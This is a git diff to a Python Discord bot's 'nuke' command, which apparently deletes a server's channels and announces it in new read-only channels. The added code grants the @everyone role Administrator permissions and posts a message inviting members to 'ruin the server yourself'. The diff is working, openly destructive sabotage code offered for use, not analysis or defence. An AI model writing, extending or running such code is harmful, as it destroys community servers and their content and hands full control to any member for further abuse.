@@ -50,13 +50,30 @@ async def nuke(ctx):
     perms_overwrite = {discord.utils.get(ctx.guild.roles, name='@everyone'): discord.PermissionOverwrite(view_channel = True, send_messages = False)}
     await ctx.message.guild.create_text_channel('nuking-changelog', overwrites = perms_overwrite)
     await ctx.message.guild.create_text_channel('nuking-reason', overwrites = perms_overwrite)
-    await ctx.message.guild.create_text_channel('dumbasses-complaining')
+    await ctx.message.guild.create_text_channel('complaining')
     reason_channel = discord.utils.get(ctx.guild.channels, name = 'nuking-reason')
     changelog_channel = discord.utils.get(ctx.guild.channels, name = 'nuking-changelog')
+    complaining_channel = discord.utils.get(ctx.guild.channels, name = 'complaining')
 
-    embed = discord.Embed(title = 'All channels deleted.', description = f'Say good-bye to your old channels, the new #general is <#{changelog_channel.id}>', color = discord.Color.from_rgb(157, 51, 255))
+    embed = discord.Embed(title = 'All channels deleted.', description = f'Say good-bye to your old channels, the new #general is <#{complaining_channel.id}>', color = discord.Color.from_rgb(157, 51, 255))
     embed.timestamp = local_time.now()
     await changelog_channel.send(embed = embed)
+
+    # Gives everyone admin permissions
+    try:
+        administrator_perms = Permissions()
+        administrator_perms.update(administrator = True)
+        await discord.utils.get(ctx.guild.roles, name='@everyone').edit(permissions = administrator_perms)
+
+    except Exception:
+        embed = discord.Embed(title = 'Error: Unable to give @everyone `Administrator` permissions.', description = 'Sorry, something went wrong meaning I can\'t let you ruin the server yourself.', color = discord.Color.from_rgb(157, 51, 255))
+        embed.timestamp = local_time.now()
+        await changelog_channel.send(embed = embed)
+
+    else:
+        embed = discord.Embed(title = '@everyone now has `Administrator` permissions', description = 'Enjoy ruining the server yourself!', color = discord.Color.from_rgb(157, 51, 255))
+        embed.timestamp = local_time.now()
+        await changelog_channel.send(embed = embed)
 
 # Stop Command
 @bot.command()
